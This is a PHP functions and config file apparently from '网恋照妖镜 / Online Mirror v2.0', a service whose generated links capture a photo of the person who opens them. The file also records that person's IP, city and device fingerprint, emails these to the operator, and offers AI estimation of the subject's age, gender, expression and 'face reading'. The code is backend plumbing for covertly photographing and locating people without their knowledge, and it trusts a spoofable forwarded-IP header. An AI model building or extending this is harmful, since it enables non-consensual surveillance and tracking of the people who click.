<?php

// ========== 📦 数据库配置 ==========
// 请修改为你的实际数据库信息，或通过安装向导自动配置
// 安装向导：浏览器访问 install.php

define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
define('DB_USER', getenv('DB_USER') ?: 'root');
define('DB_PASS', getenv('DB_PASS') ?: '');
define('DB_NAME', getenv('DB_NAME') ?: 'mirror');
define('IMG_DIR', __DIR__ . '/img/');
define('SITE_URL', (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . '/mirror/');

// ========== 🔒 安全增强 ==========
// 安全响应头
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');

// 自动创建img目录
if (!file_exists(IMG_DIR)) {
    mkdir(IMG_DIR, 0755, true);
}

// 安全写入img防护文件
if (!file_exists(IMG_DIR . 'index.html')) {
    file_put_contents(IMG_DIR . 'index.html', '<!DOCTYPE html><html><head><title></title></head><body></body></html>');
}
if (!file_exists(IMG_DIR . '.htaccess')) {
    file_put_contents(IMG_DIR . '.htaccess', "Options -Indexes\n<FilesMatch \"\.(php|php5|phtml|inc|cgi|pl|sh|py)$\">\nOrder Deny,Allow\nDeny from all\n</FilesMatch>");
}

/**
 * 获取数据库连接
 */
function getDB() {
    static $pdo = null;
    if ($pdo === null) {
        try {
            $pdo = new PDO('mysql:host=' . DB_HOST . ';dbname=' . DB_NAME . ';charset=utf8mb4', DB_USER, DB_PASS, [
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
                PDO::ATTR_EMULATE_PREPARES => false,
            ]);
        } catch (PDOException $e) {
            header('HTTP/1.1 500 Internal Server Error');
            die('系统繁忙，请稍后再试');
        }
    }
    return $pdo;
}

/**
 * 🔒 CSRF 生成Token
 */
function csrfToken() {
    if (session_status() === PHP_SESSION_NONE) session_start();
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

/**
 * 🔒 CSRF 验证Token
 */
function csrfVerify($token) {
    if (session_status() === PHP_SESSION_NONE) session_start();
    if (empty($_SESSION['csrf_token']) || empty($token)) return false;
    return hash_equals($_SESSION['csrf_token'], $token);
}

/**
 * 🔒 验证请求的CSRF Token（同时支持POST和GET），失败则退出
 */
function requireCsrf() {
    $token = $_POST['csrf_token'] ?? $_GET['csrf_token'] ?? '';
    if (!csrfVerify($token)) {
        header('HTTP/1.1 403 Forbidden');
        die('安全验证失败，请刷新页面重试');
    }
}

/**
 * 🔒 登录尝试频率限制（防止暴力破解）
 */
function checkLoginRateLimit() {
    $ip = getClientIP();
    try {
        $db = getDB();
        // 10分钟内失败超过5次就限流
        $stmt = $db->prepare("SELECT COUNT(*) FROM logs WHERE action='login_fail' AND ip_address = ? AND created_at >= DATE_SUB(NOW(), INTERVAL 10 MINUTE)");
        $stmt->execute([$ip]);
        $count = $stmt->fetchColumn();
        if ($count >= 5) {
            return [false, '登录尝试过于频繁，请10分钟后再试'];
        }
        return [true, ''];
    } catch (Exception $e) {
        return [true, ''];
    }
}

/**
 * 获取客户端真实IP（加强版）
 */
function getClientIP() {
    // 按可信度从高到低检查
    $headers = ['HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
    foreach ($headers as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = $_SERVER[$h];
            if ($h === 'HTTP_X_FORWARDED_FOR') {
                $ip = explode(',', $ip)[0];
            }
            $ip = filter_var(trim($ip), FILTER_VALIDATE_IP);
            if ($ip) return $ip;
        }
    }
    return '0.0.0.0';
}

/**
 * 🔒 严格过滤输入字符串
 */
function cleanInput($str) {
    if (empty($str)) return '';
    $str = strip_tags($str);
    $str = trim($str);
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

/**
 * 记录日志
 */
function addLog($link_id, $action) {
    try {
        $db = getDB();
        $stmt = $db->prepare("INSERT INTO logs (link_id, action, ip_address, user_agent) VALUES (?, ?, ?, ?)");
        $stmt->execute([$link_id, $action, getClientIP(), mb_substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 500)]);
    } catch (Exception $e) {
        // 静默失败
    }
}

/**
 * 生成随机ID
 */
function generateID($length = 6) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $id = '';
    for ($i = 0; $i < $length; $i++) {
        $id .= $chars[random_int(0, strlen($chars) - 1)];
    }
    return $id;
}

/**
 * 检查IP是否被永久封禁
 */
function isIPBanned() {
    $ip = getClientIP();
    try {
        $db = getDB();
        $stmt = $db->prepare("SELECT COUNT(*) FROM banned_ips WHERE ip_address = ?");
        $stmt->execute([$ip]);
        return $stmt->fetchColumn() > 0;
    } catch (Exception $e) {
        return false;
    }
}

/**
 * 检查IP是否超过创建频率
 */
function checkRateLimit() {
    $ip = getClientIP();
    $db = getDB();
    
    // 检查是否被永久封禁
    $stmt = $db->prepare("SELECT COUNT(*) FROM banned_ips WHERE ip_address = ?");
    $stmt->execute([$ip]);
    if ($stmt->fetchColumn() > 0) {
        return [false, '⛔ 您的IP已被永久封禁，原因：频繁创建链接。如有疑问请联系管理员。'];
    }
    
    // 检查60秒内是否创建过
    $stmt = $db->prepare("SELECT COUNT(*) FROM logs WHERE action='generate' AND ip_address = ? AND created_at >= DATE_SUB(NOW(), INTERVAL 60 SECOND)");
    $stmt->execute([$ip]);
    if ($stmt->fetchColumn() > 0) {
        return [false, '⏳ 操作太频繁了，请等待60秒后再试'];
    }
    
    // 检查1小时内创建了多少个
    $stmt = $db->prepare("SELECT COUNT(*) FROM logs WHERE action='generate' AND ip_address = ? AND created_at >= DATE_SUB(NOW(), INTERVAL 1 HOUR)");
    $stmt->execute([$ip]);
    $count = $stmt->fetchColumn();
    if ($count >= 10) {
        $stmt = $db->prepare("INSERT IGNORE INTO banned_ips (ip_address, reason, banned_by) VALUES (?, '自动封禁：1小时内创建超过10个链接', 'system')");
        $stmt->execute([$ip]);
        return [false, '⛔ 您的IP已被永久封禁，原因：频繁创建链接。如有疑问请联系管理员。'];
    }
    
    return [true, ''];
}

/**
 * 📧 获取设置值
 */
function getSetting($key) {
    try {
        $db = getDB();
        $stmt = $db->prepare("SELECT `value` FROM mir_settings WHERE `key` = ?");
        $stmt->execute([$key]);
        $row = $stmt->fetch();
        return $row ? $row['value'] : null;
    } catch (Exception $e) {
        return null;
    }
}

/**
 * 📧 更新设置值
 */
function setSetting($key, $value) {
    try {
        $db = getDB();
        $stmt = $db->prepare("INSERT INTO mir_settings (`key`, `value`) VALUES (?, ?) ON DUPLICATE KEY UPDATE `value` = VALUES(`value`)");
        $stmt->execute([$key, $value]);
    } catch (Exception $e) {}
}


/**
 * 🤖 获取 AI 分析设置
 */
function getAISettings() {
    return [
        'model' => getSetting('ai_model') ?: 'glm-4v-flash',
        'api_key' => getSetting('ai_api_key') ?: '',
        'prompt' => getSetting('ai_prompt') ?: '',
        'quota' => intval(getSetting('ai_daily_quota') ?: 100),
        'options' => [
            'has_person' => getSetting('ai_option_has_person') !== '0',
            'age' => getSetting('ai_option_age') !== '0',
            'gender' => getSetting('ai_option_gender') !== '0',
            'expression' => getSetting('ai_option_expression') !== '0',
            'is_real' => getSetting('ai_option_is_real') !== '0',
        ],
        'more_options' => [
            'face_read' => getSetting('ai_option_face_read') !== '0',
            'environment' => getSetting('ai_option_environment') !== '0',
            'scene_desc' => getSetting('ai_option_scene_desc') !== '0',
            'light_color' => getSetting('ai_option_light_color') !== '0',
            'shoot_scene' => getSetting('ai_option_shoot_scene') !== '0',
        ],
    ];
}
/**
 * 📧 构建华丽的邮件HTML模板
 */
function buildEmailBody($link_id, $city, $ip, $os, $browser, $time, $photo_url) {
    return <<<EOT
<html>
<head>
<meta charset="UTF-8">
</head>
<body style="margin:0;padding:0;background:#0f0c29;font-family:'Segoe UI',-apple-system,BlinkMacSystemFont,sans-serif;">
<center>
<div style="max-width:580px;margin:40px auto 20px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);border-radius:20px;overflow:hidden;box-shadow:0 25px 60px rgba(0,0,0,0.6);backdrop-filter:blur(10px);">

<!-- 顶栏 -->
<div style="background:linear-gradient(135deg,#667eea,#764ba2,#f093fb);padding:32px 20px 24px;text-align:center;">
<div style="font-size:48px;margin-bottom:8px;">📸</div>
<h1 style="color:#fff;margin:0 0 4px;font-size:22px;font-weight:700;letter-spacing:1px;">新拍照捕获通知</h1>
<p style="color:rgba(255,255,255,0.75);margin:0;font-size:14px;">网恋照妖镜 · Online Mirror v2.0</p>
</div>

<!-- 内容区 -->
<div style="padding:24px 28px;">

<!-- 摘要卡片 -->
<div style="background:rgba(102,126,234,0.08);border:1px solid rgba(102,126,234,0.15);border-radius:14px;padding:16px 20px;margin-bottom:18px;">
<p style="margin:0 0 6px;font-size:13px;color:#8080c0;text-transform:uppercase;letter-spacing:0.5px;">📋 基本信息</p>
<table style="width:100%;border-collapse:collapse;font-size:14px;">
<tr><td style="padding:6px 0;color:#8080a0;width:90px;">链接ID</td><td style="padding:6px 0;color:#e0e0e0;font-weight:600;font-family:monospace;letter-spacing:0.5px;">{$link_id}</td></tr>
<tr><td style="padding:6px 0;color:#8080a0;">拍照时间</td><td style="padding:6px 0;color:#e0e0e0;">{$time}</td></tr>
</table>
</div>

<!-- 定位信息 -->
<div style="background:rgba(76,175,80,0.06);border:1px solid rgba(76,175,80,0.12);border-radius:14px;padding:16px 20px;margin-bottom:18px;">
<p style="margin:0 0 6px;font-size:13px;color:#66bb6a;text-transform:uppercase;letter-spacing:0.5px;">📍 位置信息</p>
<table style="width:100%;border-collapse:collapse;font-size:14px;">
<tr><td style="padding:6px 0;color:#8080a0;width:90px;">IP地址</td><td style="padding:6px 0;color:#e0e0e0;font-family:monospace;">{$ip}</td></tr>
<tr><td style="padding:6px 0;color:#8080a0;">城市</td><td style="padding:6px 0;color:#e0e0e0;">{$city}</td></tr>
</table>
</div>

<!-- 设备指纹 -->
<div style="background:rgba(255,152,0,0.06);border:1px solid rgba(255,152,0,0.12);border-radius:14px;padding:16px 20px;margin-bottom:18px;">
<p style="margin:0 0 6px;font-size:13px;color:#ffa726;text-transform:uppercase;letter-spacing:0.5px;">💻 设备指纹</p>
<table style="width:100%;border-collapse:collapse;font-size:14px;">
<tr><td style="padding:6px 0;color:#8080a0;width:90px;">系统</td><td style="padding:6px 0;color:#e0e0e0;">{$os}</td></tr>
<tr><td style="padding:6px 0;color:#8080a0;">浏览器</td><td style="padding:6px 0;color:#e0e0e0;">{$browser}</td></tr>
</table>
</div>

<!-- 查看按钮 -->
<table style="width:100%;border-collapse:collapse;">
<tr>
<td style="text-align:center;padding:8px 0;">
<a href="{$photo_url}" style="display:inline-block;padding:14px 40px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-decoration:none;border-radius:12px;font-size:15px;font-weight:600;letter-spacing:0.5px;box-shadow:0 4px 15px rgba(102,126,234,0.4);">立即查看照片 →</a>
</td>
</tr>
<tr>
<td style="text-align:center;padding:12px 0 0;font-size:12px;color:#606080;">
点击上方按钮前往后台查看照片详情
</td>
</tr>
</table>

</div>

<!-- 底部 -->
<div style="background:rgba(0,0,0,0.2);padding:16px 20px;text-align:center;border-top:1px solid rgba(255,255,255,0.04);">
<p style="margin:0;font-size:11px;color:#606080;line-height:1.8;">
🪞 网恋照妖镜 v2.0 · 自动通知邮件<br>
<span style="color:#404060;">此邮件由系统自动发送，请勿回复</span>
</p>
</div>

</div>

<!-- 页脚 -->
<p style="text-align:center;font-size:11px;color:#404060;margin:20px 0 40px;">
<span style="opacity:0.5;">Online Mirror · 是小姐姐，还是网图哥？一照便知！</span>
</p>
</center>
</body>
</html>
EOT;
}

/**
 * 📧 通过SMTP直接发送邮件（无需本地MTA）
 * @return array ['success' => bool, 'error' => string]
 */
function sendSmtpMail($to, $subject, $body, $from, $smtp_host, $smtp_port, $smtp_secure, $password) {
    $errstr = '';
    
    try {
        // 1. SSL连接
        $prefix = ($smtp_secure === 'ssl') ? 'ssl://' : '';
        $errno = 0;
        $fp = @stream_socket_client($prefix . $smtp_host . ':' . $smtp_port, $errno, $errstr, 15);
        if (!$fp) {
            return ['success' => false, 'error' => "连接失败: {$errstr} ({$errno})"];
        }
        
        $log = [];
        
        // 读取响应
        $readResp = function($fp) use (&$log) {
            $resp = '';
            while ($line = @fgets($fp, 512)) {
                $resp .= $line;
                if (isset($line[3]) && $line[3] === ' ') break;
            }
            $log[] = trim($resp);
            return $resp;
        };
        
        // 发送命令
        $sendCmd = function($fp, $cmd) {
            @fwrite($fp, $cmd . "\r\n");
            usleep(150000);
        };
        
        // 读取服务器问候
        $readResp($fp);
        
        // 2. EHLO
        $hostname = gethostname() ?: 'localhost';
        $sendCmd($fp, "EHLO {$hostname}");
        $ehloResp = $readResp($fp);
        
        // 3. STARTTLS（如果是tls模式）
        if ($smtp_secure === 'tls') {
            $sendCmd($fp, 'STARTTLS');
            $readResp($fp);
            $crypto = @stream_socket_enable_crypto($fp, true, STREAM_CRYPTO_METHOD_TLS_CLIENT);
            if (!$crypto) {
                fclose($fp);
                return ['success' => false, 'error' => 'TLS握手失败'];
            }
            // 重新EHLO
            $sendCmd($fp, "EHLO {$hostname}");
            $readResp($fp);
        }
        
        // 4. AUTH LOGIN
        $sendCmd($fp, 'AUTH LOGIN');
        $resp = $readResp($fp);
        if (substr($resp, 0, 3) !== '334') {
            fclose($fp);
            return ['success' => false, 'error' => "AUTH失败: {$resp}"];
        }
        
        $sendCmd($fp, base64_encode($from));
        $resp = $readResp($fp);
        if (substr($resp, 0, 3) !== '334') {
            fclose($fp);
            return ['success' => false, 'error' => "用户名被拒: {$resp}"];
        }
        
        $sendCmd($fp, base64_encode($password));
        $resp = $readResp($fp);
        if (substr($resp, 0, 3) !== '235') {
            fclose($fp);
            return ['success' => false, 'error' => "授权码错误: {$resp}"];
        }
        
        // 5. MAIL FROM
        $sendCmd($fp, "MAIL FROM:<{$from}>");
        $resp = $readResp($fp);
        if (substr($resp, 0, 3) !== '250') {
            fclose($fp);
            return ['success' => false, 'error' => "发件人被拒: {$resp}"];
        }
        
        // 6. RCPT TO
        $sendCmd($fp, "RCPT TO:<{$to}>");
        $resp = $readResp($fp);
        if (substr($resp, 0, 3) !== '250') {
            fclose($fp);
            return ['success' => false, 'error' => "收件人被拒: {$resp}"];
        }
        
        // 7. DATA
        $sendCmd($fp, 'DATA');
        $resp = $readResp($fp);
        if (substr($resp, 0, 3) !== '354') {
            fclose($fp);
            return ['success' => false, 'error' => "DATA被拒: {$resp}"];
        }
        
        // 8. 发送邮件内容（Headers + Body）
        $headers = "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
        $headers .= "From: =?UTF-8?B?" . base64_encode('网恋照妖镜') . "?= <{$from}>\r\n";
        $headers .= "To: <{$to}>\r\n";
        $headers .= "Subject: =?UTF-8?B?" . base64_encode($subject) . "?=\r\n";
        $headers .= "X-Mailer: Mirror-Notifier/2.0\r\n";
        
        // 修复：确保邮件正文中不包含单独的.作为行首
        $bodySafe = preg_replace('/^\\./m', '..', $body);
        
        @fwrite($fp, $headers . "\r\n" . $bodySafe . "\r\n.\r\n");
        $resp = $readResp($fp);
        if (substr($resp, 0, 3) !== '250') {
            fclose($fp);
            return ['success' => false, 'error' => "发送失败: {$resp}"];
        }
        
        // 9. QUIT
        $sendCmd($fp, 'QUIT');
        @fclose($fp);
        
        return ['success' => true, 'error' => ''];
        
    } catch (Exception $e) {
        if (isset($fp) && $fp) @fclose($fp);
        return ['success' => false, 'error' => '异常: ' . $e->getMessage()];
    }
}

/**
 * 📧 发送邮件通知（直接通过SMTP服务器）
 */
function sendEmailNotify($link_id, $photo_info) {
    try {
        if (getSetting('email_enabled') !== '1') return false;
        
        $to = getSetting('email_receive_address');
        $from = getSetting('email_send_address');
        $smtp_host = getSetting('email_smtp_host');
        $smtp_port = getSetting('email_smtp_port');
        $smtp_secure = getSetting('email_smtp_secure');
        $password = getSetting('email_send_password');
        
        if (empty($to) || empty($from) || empty($smtp_host) || empty($password)) return false;
        
        $subject = '📸 网恋照妖镜 - 新拍照通知';
        $city = $photo_info['city'] ?? '未知';
        $ip = $photo_info['ip_address'] ?? '未知';
        $time = date('Y-m-d H:i:s');
        $browser = $photo_info['browser'] ?? '未知';
        $os = $photo_info['os'] ?? '未知';
        
        $site_url = SITE_URL;
        $photo_url = $site_url . 'photos.php?id=' . urlencode($link_id);
        
        $body = buildEmailBody($link_id, $city, $ip, $os, $browser, $time, $photo_url);
        
        $result = sendSmtpMail($to, $subject, $body, $from, $smtp_host, $smtp_port, $smtp_secure, $password);
        
        // 记录发送日志
        if (!$result['success']) {
            error_log('[Mirror Email] 发送失败: ' . $result['error']);
        }
        
        return $result['success'];
    } catch (Exception $e) {
        error_log('[Mirror Email] 异常: ' . $e->getMessage());
        return false;
    }
}

/**
 * 🌐 获取IP地理信息（缓存在session中减少API调用）
 */
function getIPGeo($ip) {
    if ($ip === '0.0.0.0' || $ip === '127.0.0.1' || $ip === '::1') return null;
    
    $cache_key = 'geo_' . str_replace('.', '_', $ip);
    if (session_status() === PHP_SESSION_NONE) session_start();
    if (isset($_SESSION[$cache_key])) {
        return $_SESSION[$cache_key];
    }
    
    $url = "http://ip-api.com/json/{$ip}?fields=query,city,regionName,country,isp,org&lang=zh-CN";
    $ctx = stream_context_create(['http' => ['timeout' => 3]]);
    $resp = @file_get_contents($url, false, $ctx);
    if ($resp) {
        $data = json_decode($resp, true);
        if ($data && isset($data['city'])) {
            $result = [
                'city' => ($data['city'] ?? '') . ', ' . ($data['regionName'] ?? ''),
                'isp' => $data['isp'] ?? $data['org'] ?? '',
            ];
            $_SESSION[$cache_key] = $result;
            return $result;
        }
    }
    return null;
}

/**
 * 检查是否已登录
 */
function isLoggedIn() {
    return isset($_SESSION['user_id']);
}

/**
 * 获取当前用户
 */
function getCurrentUser() {
    if (!isset($_SESSION['user_id'])) return null;
    try {
        $db = getDB();
        $stmt = $db->prepare("SELECT id, username, role FROM users WHERE id = ?");
        $stmt->execute([$_SESSION['user_id']]);
        return $stmt->fetch();
    } catch (Exception $e) {
        return null;
    }
}

/**
 * 要求登录（含CSRF初始化）
 */
function requireLogin() {
    session_start();
    if (!isLoggedIn()) {
        header('Location: login.php');
        exit;
    }
    // 刷新CSRF token（保持同一个）
    csrfToken();
}

/**
 * 格式化文件大小
 */
function formatSize($bytes) {
    if ($bytes >= 1048576) return round($bytes / 1048576, 1) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 1) . ' KB';
    return $bytes . ' B';
}
